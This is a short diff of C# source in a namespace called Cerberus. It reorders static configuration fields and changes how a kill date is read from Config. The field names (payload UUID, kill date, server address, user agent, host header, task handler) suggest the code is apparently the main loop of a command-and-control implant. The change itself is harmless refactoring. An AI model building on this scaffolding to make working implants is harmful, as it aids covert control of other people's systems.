@@ -28,16 +28,19 @@ namespace Cerberus
         private static string serverAddress = Config.ServerAddress;
         private static int serverPort = Config.ServerPort;
 
+        private static string PayloadUUID = Config.PayloadUUID;
+        private static string UUID = "";
+
+        private static DateTime killdate;
+
         // http params
         private static string URI = Config.URI;
         private static string UserAgent = Config.UserAgent;
         private static string HostHeader;
 
-        private static string PayloadUUID = Config.PayloadUUID;
-        private static string UUID = "";
+        
 
-        private static string killdateString = Config.killdateString;
-        private static DateTime killdate;
+        
 
 
 
@@ -46,13 +49,11 @@ namespace Cerberus
         static void Main(string[] args)
         {
             //Thread.Sleep(5000);
-            if(DateTime.TryParse(killdateString, out var date))
+            if(DateTime.TryParse(Config.killdateString, out var date))
             {
                 killdate = date;
                 // dont forget to set defualt val in build params
             }
-
-
 
             _taskHandler = new TaskHandler();
 
